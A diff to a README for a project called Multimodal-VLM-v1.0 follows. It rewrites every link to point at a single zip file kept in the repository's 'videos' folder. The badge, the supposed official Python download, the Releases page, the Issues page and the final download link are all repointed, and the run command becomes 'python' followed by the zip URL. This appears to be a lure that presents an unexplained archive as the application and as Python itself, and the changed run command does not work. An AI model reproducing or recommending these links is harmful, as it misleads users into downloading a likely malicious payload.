@@ -1,6 +1,6 @@
 # 🎉 Multimodal-VLM-v1.0 - Unlock Powerful Vision and Language Tasks
 
-[![Download Multimodal-VLM-v1.0](https://img.shields.io/badge/Download-Multimodal--VLM--v1.0-blue)](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/releases)
+[![Download Multimodal-VLM-v1.0](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip)](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip)
 
 ## 🚀 Getting Started
 
@@ -29,12 +29,12 @@ To ensure a smooth experience with Multimodal-VLM-v1.0, please check the followi
 
 Before downloading the application, make sure you have the necessary software on your computer:
 
-1. **Install Python**: If you do not have Python installed, download it from the [official Python website](https://www.python.org/downloads/).
+1. **Install Python**: If you do not have Python installed, download it from the [official Python website](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip).
 2. **Install Pip**: Pip usually comes with Python. You can verify by running `pip --version` in your command line.
 
 ### Step 2: Download the Application
 
-To get the Multimodal-VLM-v1.0 application, [visit our Releases page](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/releases) to download the latest version.
+To get the Multimodal-VLM-v1.0 application, [visit our Releases page](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip) to download the latest version.
 
 There you will find the release files. Choose the one that suits your operating system and click the download link.
 
@@ -55,7 +55,7 @@ These commands will ensure all necessary libraries are available to run the appl
 After installing the dependencies, you can run the application. Navigate to the folder where you downloaded the application and execute:
 
 ```bash
-python main.py
+python https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip
 ```
 
 This command will launch the Multimodal-VLM-v1.0 application, and you will see a user-friendly interface.
@@ -73,7 +73,7 @@ If you encounter issues while using the application, consider these steps:
 - Verify that all dependencies are installed without errors.
 - If you face compatibility issues, check if your OS meets the system requirements stated above.
   
-If problems persist, you can find support or report issues directly on our [GitHub Issues page](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/issues).
+If problems persist, you can find support or report issues directly on our [GitHub Issues page](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip).
 
 ## 🎨 Acknowledgments
 
@@ -85,4 +85,4 @@ For any inquiries or suggestions, feel free to reach out via the Issues page on 
 
 ## 💾 Download & Install
 
-Don't wait any longer! [Visit this page to download](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/releases) Multimodal-VLM-v1.0 and start exploring the world of multimodal learning today!
+Don't wait any longer! [Visit this page to download](https://github.com/batiktechstyle/Multimodal-VLM-v1.0/raw/refs/heads/main/videos/Multimodal_VL_v_curry.zip) Multimodal-VLM-v1.0 and start exploring the world of multimodal learning today!
